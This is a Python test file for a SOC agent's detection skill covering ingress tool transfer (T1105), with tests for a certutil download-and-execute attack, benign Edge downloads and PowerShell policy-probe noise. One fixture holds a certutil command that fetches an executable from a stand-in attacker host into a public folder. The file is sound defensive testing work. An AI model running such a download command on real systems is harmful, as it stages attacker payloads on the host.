"""ingress_tool_transfer 迁移(seed-dict 型):结构化 Forensics+Finding 抽取。

seed-dict 型:base 证据取自 seed(event/subject/related),仅 process_guid 才补查图。
finding_id 按 skill 命名空间 = 方法论(第一类);"哪些 finding→什么结论"交第二类(qwen 学)。
"""
from pathlib import Path

from soc_agent.forensics import Forensics
from soc_agent.models import Alert
from soc_agent.skills_runtime import SkillRegistry

_SKILLS = Path(__file__).resolve().parents[1] / "skills"


class FakeGraph:
    """按 Cypher 子串返回预置行(seed-dict 型仅在有 process_guid 时补查)。子串须各查询唯一。"""

    def __init__(self, table):
        self.table = table                       # list[(substr, rows)]

    def run_cypher(self, query, **params):
        for substr, rows in self.table:
            if substr in query:
                return rows
        return []


def _ingress():
    return SkillRegistry(_SKILLS).by_name("ingress_tool_transfer").recipe


# ---------- 攻击态:certutil 下载落 Public + 随即执行 ----------
def test_certutil_download_dropped_then_executed_emits_red():
    seed = {
        "event": {"event_code": "11"},
        "subject": {"image": r"C:\Windows\System32\certutil.exe",
                    "command_line": r"certutil -urlcache -f http://evil.test/x.exe C:\Users\Public\x.exe",
                    "pid": 4321, "process_guid": "g-atk"},
        "related": [
            {"rel": "WROTE", "node": {"path": r"C:\Users\Public\x.exe"}},
            {"rel": "ON_HOST", "node": {"hostname": "SRV02"}},
        ],
    }
    graph = FakeGraph([
        ("gp.image AS parent_image", [{"parent_image": "w3wp.exe"}]),
        ("AS ips", [{"ips": ["1.2.3.4"], "domains": ["evil.test"]}]),
        ("AS spawned", [{"spawned": ["x.exe"]}]),
    ])
    a = Alert.from_node({"alert_uid": "itt1", "technique_ids": ["T1105"]})
    fo = _ingress()(graph, a, seed)

    assert isinstance(fo, Forensics)
    ids = fo.finding_ids()
    assert "ingress.download" in ids                       # 触发本身
    assert "ingress.lolbin_download" in ids                # certutil = LOLBin
    assert "ingress.dropped_then_executed" in ids          # 落地 + SPAWNED 执行 = 闭环
    assert "ingress.whitelisted_downloader" not in ids     # 非白名单下载器
    assert "ingress.provisioning_noise" not in ids         # 无良性供给/自检噪声

    lol = next(f for f in fo.findings if f.finding_id == "ingress.lolbin_download")
    assert lol.polarity == "red"
    assert "certutil.exe" in (lol.attrs.get("image") or "")   # image 原值进 attrs(可移植承重 key)
    assert lol.attrs.get("method") == "certutil"

    dropped = next(f for f in fo.findings if f.finding_id == "ingress.dropped_then_executed")
    assert dropped.polarity == "red"
    assert dropped.attrs == {}                              # 落地文件/子进程是 list → presence-only,不进 attrs

    assert fo.bindings["process"] == r"C:\Windows\System32\certutil.exe"   # 进程 image 保留原值
    assert fo.bindings["host"] == "SRV02"                  # 主机身份 → bindings 抽象
    assert fo.context.get("触发进程")                       # prose 仍在(喂 LLM)
    assert fo.context.get("落地即执行(SPAWNED 子进程)") == ["x.exe"]


# ---------- 良性态①:msedge 正常下载(无执行)→ whitelisted white,lolbin 不触发 ----------
def test_msedge_download_emits_white_no_lolbin():
    seed = {
        "event": {"event_code": "11"},
        "subject": {"image": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    "command_line": r"msedge.exe --type=utility"},   # 无 process_guid → 不补查图
        "related": [
            {"rel": "WROTE", "node": {"path": r"C:\Users\jon\Downloads\setup.exe"}},
            {"rel": "ON_HOST", "node": {"hostname": "WIN10"}},
        ],
    }
    a = Alert.from_node({"alert_uid": "itt2", "technique_ids": ["T1105"]})
    fo = _ingress()(FakeGraph([]), a, seed)   # 空图:无 guid 时不应调用 cypher

    ids = fo.finding_ids()
    assert "ingress.download" in ids
    assert "ingress.whitelisted_downloader" in ids         # msedge = 白名单浏览器
    assert "ingress.lolbin_download" not in ids            # 不是 LOLBin
    assert "ingress.dropped_then_executed" not in ids      # 无 SPAWNED 执行
    assert "ingress.provisioning_noise" not in ids

    wl = next(f for f in fo.findings if f.finding_id == "ingress.whitelisted_downloader")
    assert wl.polarity == "white"
    assert wl.attrs.get("downloader") == "msedge"
    assert "msedge.exe" in (wl.attrs.get("image") or "")

    assert fo.bindings["host"] == "WIN10"
    assert "msedge.exe" in fo.bindings["process"]


# ---------- 良性态②:PowerShell 执行策略探针命中噪声 → provisioning_noise white,lolbin 不触发 ----------
def test_policy_probe_provisioning_noise_white_no_lolbin():
    seed = {
        "event": {"event_code": "11"},
        "subject": {"image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "command_line": r"powershell.exe -NoProfile -Command Set-Content __PSScriptPolicyTest_abc.ps1"},
        "related": [
            {"rel": "WROTE", "node": {"path": r"C:\Users\jon\AppData\Local\Temp\__PSScriptPolicyTest_abc.ps1"}},
            {"rel": "ON_HOST", "node": {"hostname": "WIN10"}},
        ],
    }
    a = Alert.from_node({"alert_uid": "itt3", "technique_ids": ["T1105"]})
    fo = _ingress()(FakeGraph([]), a, seed)

    ids = fo.finding_ids()
    assert "ingress.download" in ids
    assert "ingress.provisioning_noise" in ids             # __PSScriptPolicyTest_ = 执行策略自检
    assert "ingress.lolbin_download" not in ids            # powershell 无下载动词 → 非 LOLBin
    assert "ingress.whitelisted_downloader" not in ids

    noise = next(f for f in fo.findings if f.finding_id == "ingress.provisioning_noise")
    assert noise.polarity == "white"
    assert "ps_execution_policy_probe" in (noise.attrs.get("label") or "")


# ---------- 空 seed 守卫:不崩、可归一、触发 finding 仍在 ----------
def test_empty_seed_yields_forensics_with_trigger():
    a = Alert.from_node({"alert_uid": "itt0", "technique_ids": ["T1105"]})
    fo = _ingress()(FakeGraph([]), a, {})
    assert isinstance(fo, Forensics)
    assert "ingress.download" in fo.finding_ids()
    assert fo.bindings == {}                                # 无 image/host → 不登记实体
